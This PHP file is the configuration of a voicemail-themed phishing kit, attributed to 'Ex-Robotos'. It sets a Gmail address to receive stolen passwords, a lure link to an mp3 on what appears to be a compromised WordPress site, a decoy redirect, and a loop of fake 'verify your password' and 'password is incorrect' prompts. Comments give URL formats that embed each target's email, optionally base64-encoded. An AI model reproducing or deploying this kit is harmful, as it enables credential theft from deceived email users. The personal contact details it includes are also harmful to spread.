<?php
/* 
Voicemail Scmpage 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
@session_start();error_reporting(0);

$to = "cheyennerose112@gmail.com";  
$officeLink = "http://camimenko.com/wordpress/wp-content/plugins/YouMail_voicemail_PDT_25sec.mp3";
$FailRedirect = "https://www.wikipedia.org/wiki/Microsoft_Office";
$base64encodeData = true;//true OR false(using base64encoded email value in link or not)
$passloopNumber = 3; //1 to 4
$firstmsg= "Because you're accessing sensitive info, you need to verify your password to access your Voicemail."; 
$error  =  "Sign in attempt timeout, verify your password to access voicemail."; 
$error2 =  $error3  =  $error4 = $error5 = "Your password is incorrect. If you don't remember your password"; 
###Link Examples:###
### Base64 Encoded Email###
#### domain.com/office/?email=base64(email)  #####
#### domain.com/office/?target=base64(email)  #####
#### domain.com/office/?data=base64(email)  #####
### Not Encoded Email###
#### domain.com/office/?email=email  #####
#### domain.com/office/?target=email  #####
#### domain.com/office/?data=email  #####
?>